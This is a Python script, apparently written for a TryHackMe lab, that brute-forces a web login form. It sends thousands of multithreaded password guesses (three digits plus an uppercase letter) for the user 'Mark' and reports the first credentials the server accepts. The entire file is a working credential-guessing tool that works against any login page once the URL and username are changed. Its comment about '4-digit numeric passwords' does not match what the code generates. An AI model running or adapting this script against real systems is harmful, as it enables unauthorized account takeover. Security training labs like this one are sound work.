import requests
import string 
from itertools import product
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://python.thm/labs/lab1/index.php"
username = "Mark"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [f"{num:03}{char}" for num, char in product(range(1000), string.ascii_uppercase)]

class BruteForcer:
    def __init__(self):
        self.found_password = False
        self.lock = threading.Lock()
        self.correct_password = None

    def log(self, message):
        """Single point of control for all output"""
        with self.lock:
            if not self.found_password:
                print(message)

    def try_password(self, password):
        if self.found_password:
            return False

        try:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            
            if "Invalid" not in response.text:
                with self.lock:
                    if not self.found_password:
                        self.found_password = True
                        self.correct_password = password
                        print(f"[+] Found valid credentials: {username}:{password}")
                        return True
            else:
                self.log(f"[-] Attempted: {password}")
        except Exception as e:
            self.log(f"Error with {password}: {e}")
        return False

    def run(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.try_password, password) for password in password_list]
            
            for future in as_completed(futures):
                if self.found_password:
                    for f in futures:
                        f.cancel()
                    break

            executor.shutdown(wait=False)

if __name__ == "__main__":
    bruteforcer = BruteForcer()
    bruteforcer.run()
